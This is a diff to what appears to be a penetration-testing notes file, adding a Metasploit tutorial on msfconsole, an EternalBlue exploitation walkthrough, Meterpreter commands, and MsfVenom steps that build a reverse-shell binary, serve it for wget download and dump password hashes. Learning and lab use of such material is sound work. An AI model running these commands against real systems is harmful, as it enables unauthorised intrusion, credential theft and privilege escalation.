@@ -530,8 +530,8 @@ ffuf -w valid_usernames.txt:W1
 
 ### Metasploit
 
-Metasploit (or MSF for MetaSploit Framework) is a command-line security tool improving penetration testing.  
-It offers information about software vulnerabilities and IDS signature development.
+Metasploit (or MSF for Metasploit Framework) is a command-line security tool improving penetration testing.  
+It is a set of tools for information gathering, exploitation, exploit development, post-exploitation...
 
 If a vulnerability was discovered (with Nessus or sn1per for example), we can check if Metasploit has an exploit for it.  
 If it does, we can execute the exploit, and Metasploit can provide a command shell on this victim machine.  
@@ -539,6 +539,282 @@ If it does, we can execute the exploit, and Metasploit can provide a command she
 It is a script-kiddie friendly framework to attack machines without understanding the actual vulnerabilities.  
 It also offers more advanced capabilities, like the creation of custom plugins to exploit new vulnerabilities.
 
+The `msfconsole` command starts the Metasploit console, through which we can interact with all Metasploit modules.  
+Modules are components of the Metasploit framework built to perform a specific task (vulnerability exploit, target scan, brute-force attack...).   
+
+Modules are the core of Metasploit and are organized in a hierarchy :
+- **auxiliary** : all supporting modules, like scanners, crawlers, fuzzers...
+- **encoders** : encode the exploit and payload to obfuscate their content, making them harder to detect
+- **evasion** : implement advanced techniques to avoid detection by antivirus
+- **exploits** : module exploiting known vulnerabilities, classified by system
+- **NOPS** : No-Operation, modules doing nothing used for padding to achieve consistent payload sizes
+- **payloads** : code that run on the target system once the exploit has been executed
+- **post** : post-exploit operation, for reconnaissance, lateral movement, privilege escalation, cleanup...
+
+Many Shell commands can also be run in the Metasploit console : `ls`, `cd`, `top`, `ping`, `nmap`, `clear`, `history` ...
+
+We use the `use <MODULE>` command to load a module, which creates a local context to define variables.  
+Each module defines a set of variables that can be optional or mandatory, and can have or not a default value.  
+These variables can be displayed with the `show options` command when the module is loaded.  
+Some common variables used by various modules are :
+- `RHOSTS` (remote hosts) : target IP, IP range, network address (CIDR notation) or file containing targets
+- `RPORT` (remote port) : port on the target system
+- `PAYLOAD` : payload to use in the exploit
+- `LHOST` (local host) : the attacking machine address
+- `LPORT` (local port) : the port on the attacking machine
+- `SESSION` : session ID created by Metasploit after a successful connection to a target system, used by post-exploitation modules
+
+Modules usually come with a default payload, the action that is performed once the exploit gave access to the target.  
+The default payload is usually `reverse_tcp` that opens a shell (Meterpreter, bash or cmd) on the target machine.  
+We can see other available payloads, including different types of reverse shells, with `show payloads`, and set one with `set payload PAYLOAD_ID` 
+
+The prompt allows us to distinguish among the possible shells in Metasploit :
+- normal shell out of Metasploit
+- top-level Metasploit shell
+- shell with the context of a loaded module
+- Meterpreter shell : Metasploit payload offering a shell on the target system
+- target system shell : we may have a common cmd or bash shell on the target system
+
+```shell
+# list all types of objects we can list with the show command
+help show
+
+# show global options, or module-level options if a module is loaded
+show options
+
+# list all exploit modules in Metasploit
+show exploits
+
+# search available modules for a keyword, target system or CVE number
+search eternalblue  
+
+# display the documentation about module 0 returned in the previous search
+info 0
+
+# Load a module for use (EternalBlue exploit targeting SMBv1, leaked in Apr17 and used in WannaCry in May17)
+use exploit/windows/smb/ms17_010_eternalblue 
+
+# show payload modules that can be used with the loaded exploit
+show payloads
+
+# set a payload to use instead of the default one (using the ID in the "show payloads" output)
+set payload 2
+
+# set or unset a variable listed in "show options" for the loaded module
+set RHOSTS 10.10.166.19
+unset RHOSTS
+
+# set or unset a global variable that will be used for all modules
+setg RHOSTS 10.10.166.19
+unsetg RHOSTS
+
+# run the exploit (-z to background the session when opened)
+exploit
+run             #  alias for "exploit"
+
+# move the currently open session to the background and move back to the msfconsole prompt (Ctrl-Z does the same)
+background
+
+# exit the context and go back to the top-level Metasploit console
+back
+
+# list the existing sessions
+sessions
+
+# re-attach a session in the background, using its ID listed with "sessions"
+sessions -i 1
+```
+
+#### Exploit Example
+
+To check if a target machine is vulnerable to EternalBlue and exploit it to get a Meterpreter shell :
+```shell
+msfconsole                                     # enter the Metasploit console
+setg RHOSTS <TARGET_IP>                        # set the target IP as a global variable
+search eternalblue                             # look for modules about EternalBlue
+use auxiliary/scanner/smb/smb_ms17_010         # load the scanner (same as "use 3" referencing the search result)
+exploit                                        # run the scanner and confirm that the target is vulnerable to EternalBlue
+use exploit/windows/smb/ms17_010_eternalblue   # load the EternalBlue exploit module
+exploit                                        # run the exploit and obtain a Meterpreter shell on the target
+background                                     # put the Meterpreter shell in the background
+sessions                                       # see the Meterpreter shell in the background (usable for post-exploit)     
+```
+
+#### Useful modules
+
+- `auxiliary/scanner/portscan/tcp` : scan for open TCP ports (similar to Nmap)
+- `auxiliary/scanner/smtp/smtp_relay` : detect if an SMTP server allows open relay
+- `scanner/discovery/udp_sweep` : scan for open UDP ports
+- `scanner/smb/smb_enumshares` : enumerate the shares provided by the SMB service
+- `scanner/smb/smb_enumusers` : enumerate the SMB users
+- `scanner/smb/smb_login` : crack an SMB user password from a wordlist (we can then use `smbclient` to access a SMB share)
+- `exploit/windows/local/tokenmagic` : UAC bypass to elevate privileges of an existing session to SYSTEM
+- `exploit/windows/smb/ms17_010_eternalblue` : open a Meterpreter shell on a machine vulnerable to EternalBlue
+- `exploit/windows/smb/psexec` : open a Meterpreter (or any other payload) from a machine using SMB username/password
+- `post/linux/gather/hashdump` : post-exploit module to list user password hashes on a Linux target
+- `post/multi/manage/shell_to_meterpreter` : convert a shell to a Meterpreter shell
+- `post/multi/recon/local_exploit_suggester` : analyze the target system to suggest potential exploits
+- `post/windows/gather/enum_shares` : enumerate SMB shares
+- `post/windows/manage/enable_rdp` : enable RDP so we can remote desktop to the target machine as a compromised user
+
+#### Metasploit Database
+
+Metasploit can use a database to keep track of the multiple on-going projects.  
+It uses PostgreSQL, and can be started and initialized with :
+```shell
+systemctl start postgresql
+msfdb init
+```
+
+After the database is created, we can interact with it from inside the Metasploit console.  
+The DB status can be checked with the `db_status` command, and all database-related commands are shown with `help`.  
+For example `db_nmap` is a `nmap` variant that saves its results in the DB, viewable with the `hosts` and `services` commands.
+
+We can create workspaces to isolate different projects (by default, we are in the `default` workspace).
+```
+workspace                     # list workspaces and show active one
+workspace -a workspaceA       # create a new workspace and set it as active
+workspace workspaceA          # set a workspace as active
+workspace -d workspaceA       # delete a workspace
+```
+
+#### Meterpreter
+
+Meterpreter is a Metasploit payload that creates a specialized shell supporting penetration testing.  
+It runs on the target system, often on a reverse shell controlled from within the Metasploit console.
+
+Meterpreter runs in RAM memory as a process and does not write any file on disk in the target system, in order to avoid detection.  
+Its communication with the local machine is encrypted with TLS, so IDS will only detect it if they decrypt traffic.  
+However, Meterpreter can still be recognized by most major antivirus software.  
+
+We can list the different flavors of Meterpreter in MsfVenom with the `msfvenom -l payloads | grep meterpreter` command.  
+We can see that it has different versions depending on the OS of the target machine (Android, iOS, Linux, OSX, Windows).  
+It also has versions that depend on a technology being available on the target machine (Java, PHP, Python).  
+
+Meterpreter payloads exist in **inline** (also called **single**) or **staged** form.  
+An inline payload contains the entire payload in its binary.  
+A staged payload is smaller and contains only a stager, that downloads the rest from the attacker machine when executed.  
+Inline payloads use the `_` symbol, for example `python/meterpreter_reverse_tcp` is inline and `python/meterpreter/reverse_tcp` is its staged equivalent.  
+
+Exploits in Metasploit only support a subset of payloads, that can be listed with `show payloads` when the exploit module is loaded.
+
+Meterpreter exposes its own set of specialized commands to interact with the target machine.  
+These can vary from a version of Meterpreter to the other, so check avaliable commands listed in the `help` command. 
+
+```shell
+help                             # show available Meterpreter commands
+
+# basic shell commands
+ls
+cd <FOLDER>
+pwd
+cat "<FILE_PATH>"                     # display the content of a file
+ps                                    # list running processes
+edit <FILE_PATH>                      # edit a file
+rm <FILE_PATH>                        # delete a file
+upload <LOCAL_PATH> <REMOTE_PATH>     # transfer a file from the attacker's machine to the target machine
+download <REMOTE_PATH> <LOCAL_PATH>   # transfer a file from the target machine to the attacker's machine
+
+# Meterpreter specialized commands
+getpid                           # get the process ID of the Meterpreter process
+getuid                           # get the user that Meterpreter runs as
+guid                             # get session GUID
+sysinfo                          # show info about the target machine (including OS)
+getprivs                         # enable and list all privileges available to the current user
+search *.txt                     # look for specific files on the target host
+hashdump                         # dump the content of the SAM database (user password's hashes)
+getsystem                        # try to elevate privilege to system
+migrate <PID>                    # migrate Meterpreter to another process on the target machine
+load <METERPRETER_EXTENSION>     # load an extension : python, kiwi (updated version of mimikatz) to add new commands in Meterpreter
+  
+# networking
+arp                              # display the target machine's ARP cache
+ifconfig                         # network interfaces on the target machine
+netstat                          # network connections on the target machine
+route                            # view and modify the route table on the target machine
+
+# post-exploit modules
+info <POST_MODULE>               # show info about a post-exploit module
+run  <POST_MODULE>               # run the post-exploit module 
+
+shell                            # start a regular shell on the target machine (ctrl-Z to go back to Meterpreter)
+background                       # send this Meterpreter shell to the background (use "sessions" to see it)
+exit                             # close this Meterpreter shell
+```
+
+It can contain many other commands, like commands to control the webcam, capture keystrokes, take a screenshot, shutdown/reboot the target machine...
+
+Migrating Meterpreter to an existing process helps Meterpreter interact with it.  
+For example, we can migrate to the PID of a word-processing process (Word, Notepad...), and then capture its key strokes.  
+Note that when migrating to a process, we get the privileges of the user who started the process, and we may not be able to get back to the original privileges.  
+On Windows machine, the printer service `spoolsv.exe` is a good candidate to migrate to, because it runs as SYSTEM user and restarts on crash.
+
+Meterpreter extensions can be loaded to enrich the capabilities of the Meterpreter shell with additional commands.  
+For example, the `kiwi` extension (recent version of Mimikatz) adds commands to obtain various passwords and password hashes from the target machine.  
+It can also create a golden Kerberos ticket to get access with any user to any component of the system.
+
+
+#### MsfVenom
+
+MsfVenom is a tool to create custom payloads, replacing deprecated tools MsfPayload and MsfEncode since 2015.  
+It has access to all payloads in Metasploit and can craft payloads in several formats (PHP, exe, dll, elf, jar ...) 
+for different target systems (windows, linux, apple, android...).
+
+```shell
+msfvenom                                  # display the help
+msfvenom -l payloads                      # list all payload modules (can also list encoders, nops, formats...)
+msfvenom -p php/meterpreter/reverse_tcp   # create a payload based on reverse_tcp
+         LHOST=10.10.186.44               # set the local host to connect to 
+         -f raw                           # set the format of the payload to create
+         -e php/base64                    # set the encoder to use
+```
+
+Reverse shells or Meterpreter callbacks in the MsfVenom payloads can be caught on the attacker machine with a **handler**.  
+This is done automatically by Metasploit when running an exploit with a payload, but needs to be manually done when running 
+a custom payload crafted with MsfVenom.  
+To start this handler, we can run the `exploit/multi/handler` module in Metasploit (it needs to use the same local host as in MsfVenom).
+
+For example, we can craft a Meterpreter reverse shell binary for a x86 Linux system with : 
+```shell
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<LOCAL_IP> -f elf > reverse_shell.elf
+```
+
+We can then transfer this binary to the target system.  
+If we have a shell on the system, we can use a python HTTP server locally and `wget` on the target system :
+```shell
+# on the local machine that ran msfvenom : temporarily create a HTTP web server to expose the reverse shell binary  
+python3 -m http.server 9000
+
+# on the target machine : download the reverse shell binary
+wget http://<LOCAL_IP>:9000/reverse_shell.elf
+```
+
+Before we run the reverse shell on the target machine, we need a handler that can catch it on the local machine.  
+We can use the `exploit/multi/handler` module but we need to set its payload to the same one as the venom reverse shell (otherwise, segmentation fault).  
+```shell
+# in Metasploit console
+use exploit/multi/handler
+set LHOST <LOCAL_IP>
+set payload linux/x86/meterpreter/reverse_tcp
+exploit
+```
+
+Now Metasploit is waiting for the reverse shell of the target machine to connect to it.  
+We can start the reverse shell on the target machine (the port is 4444 by default both in the reverse shell and in the handler).  
+```shell
+chmod 777 reverse_shell.elf
+./reverse_shell.elf
+```
+
+This now gives access to a Meterpreter shell in the handler of the Metasploit console.  
+It can be either used directly, or put in the background and used to run some post-exploit modules :
+```shell
+background
+use post/linux/gather/hashdump      # load a post-exploit module to list user hashes (from /etc/shadow)
+sessions                            # check the session ID of the Meterpreter shell, let's assume it is 2
+set session 2
+exploit                             # get the hash of all users on the target machine
+```
 
 ### BeEF (Browser Exploitation Framework)
 
@@ -862,8 +1138,7 @@ It is commonly used for reverse engineering, debugging, and modifying .NET appli
 
 ### Oxford Journal of Cyber-Security
 
-Academic Journal from Oxford university offering free articles about Cyber-Security threats, attacks and latest defenses :
-
+Academic Journal from Oxford university offering free articles about Cyber-Security threats, attacks and latest defenses :  
 [https://academic.oup.com/cybersecurity](https://academic.oup.com/cybersecurity)
 
 
